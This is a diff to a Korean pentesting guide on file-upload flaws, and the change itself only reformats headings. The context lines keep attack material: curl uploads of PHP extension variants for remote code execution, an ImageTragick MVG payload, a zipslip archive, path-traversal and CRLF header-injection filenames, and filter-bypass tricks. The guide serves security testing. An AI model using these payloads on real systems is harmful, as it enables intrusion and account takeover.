@@ -1,6 +1,6 @@
 ### 기본 페이로드
 
-**무해 테스트 파일 (확인 마커 포함):**
+#### 무해 테스트 파일 (확인 마커 포함)
 ```bash
 # HTML (Stored XSS 게이트)
 echo '<h1>upload-test-'$(date +%s)'</h1>' > test.html
@@ -27,7 +27,7 @@ cat > test.svg <<'EOF'
 EOF
 ```
 
-**RCE 게이트 페이로드 (확장자 변형):**
+#### RCE 게이트 페이로드 (확장자 변형)
 ```bash
 # .phtml/.phar/.php5/.php7/.phps/.pht — Apache AddHandler 의존
 for ext in phtml phar php5 php7 phps pht; do
@@ -53,7 +53,7 @@ EOF
 curl -X POST "https://target/api/upload" -F "file=@web.config"
 ```
 
-**Stored XSS:**
+#### Stored XSS
 ```bash
 # HTML/SVG 업로드 후 inline 렌더 확인
 curl -s "https://target/uploads/test.html" -H "Accept: text/html"
@@ -76,7 +76,7 @@ curl -X POST "https://target/api/upload" \
   -F 'file=@evil.txt;filename="..\\..\\Windows\\Temp\\evil.txt"'
 ```
 
-**이미지 처리 RCE (ImageMagick/libvips):**
+#### 이미지 처리 RCE (ImageMagick/libvips)
 ```bash
 # ImageTragick (CVE-2016-3714)
 cat > evil.mvg <<'EOF'
@@ -98,7 +98,7 @@ EOF
 # libwebp CVE-2023-4863 (시험용 WEBP 페이로드 — 별도 도구 필요)
 ```
 
-**ZIP 업로드 (zipslip 결합):**
+#### ZIP 업로드 (zipslip 결합)
 ```python
 import zipfile
 z = zipfile.ZipFile('evil.zip', 'w')
@@ -109,7 +109,7 @@ z.close()
 curl -X POST "https://target/api/upload" -F "file=@evil.zip"
 ```
 
-**검증 흐름:**
+#### 검증 흐름
 ```bash
 # 1. 업로드
 curl -X POST "https://target/api/upload" -H "Cookie: session=..." \
@@ -140,7 +140,7 @@ curl -s "https://target/uploads/<PATH>/test.php"
 | 확장자 substring (마지막 `.` 검사) | `evil.php.jpg` (Apache mod_mime), `evil.jpg.php` 양쪽 시도 |
 | 화이트리스트 (jpg/png만) | jpg에 PHP 페이로드 (polyglot) — 일부 환경 해석 |
 
-**Filename CRLF (Content-Disposition 인젝션):**
+#### Filename CRLF (Content-Disposition 인젝션)
 ```bash
 curl -X POST "https://target/api/upload" \
   -F "file=@evil.txt;filename=x%0d%0aSet-Cookie:admin=true.txt"
